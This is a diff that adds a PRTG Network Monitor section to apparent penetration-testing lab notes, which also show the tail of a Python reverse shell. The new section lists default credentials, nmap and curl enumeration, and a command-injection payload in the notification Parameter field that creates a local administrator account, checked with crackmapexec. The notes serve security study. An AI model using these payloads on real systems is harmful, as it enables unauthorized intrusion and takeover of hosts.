@@ -704,3 +704,31 @@ s.connect((ip,int(port)))
 pty.spawn('/bin/bash')
 ```
 In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
+
+# PRTG Network Monitor
+PRTG Network Monitor is agentless network monitor software.
+## Discovery/Footprinting/Enumeration
+We can quickly discover PRTG from an Nmap scan. It can typically be found on common web ports such as 80, 443, or 8080.
+```
+sudo nmap -sV -p- --open -T4 $ip
+```
+We can visit the login page, the default credentials `prtgadmin:prtgadmin`.
+The scan typically shows the version number, but we can use `curl` to get that information:
+```
+curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
+```
+## Attacks
+When creating a new notification, the `Parameter` field is passed directly into a PowerShell script without any type of input sanitization.
+To begin, mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`.
+Next, click on `Add new notification`.
+Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. Finally, in the parameter field, enter a command. We can e.g. add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`.
+After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification in the list.
+Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up. 
+Now we canclick the `Test` button to run our notification and execute the command.
+After clicking Test we will get a pop-up that says `EXE notification is queued up`. If we receive any sort of error message here, we can go back and double-check the notification settings. <br>
+
+We can use `CrackMapExec` to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as evil-winrm or something from the impacket toolkit such as `wmiexec.py` or `psexec.py`.
+
+```
+sudo crackmapexec smb $ip -u prtgadm1 -p Pwn3d_by_PRTG!
+```
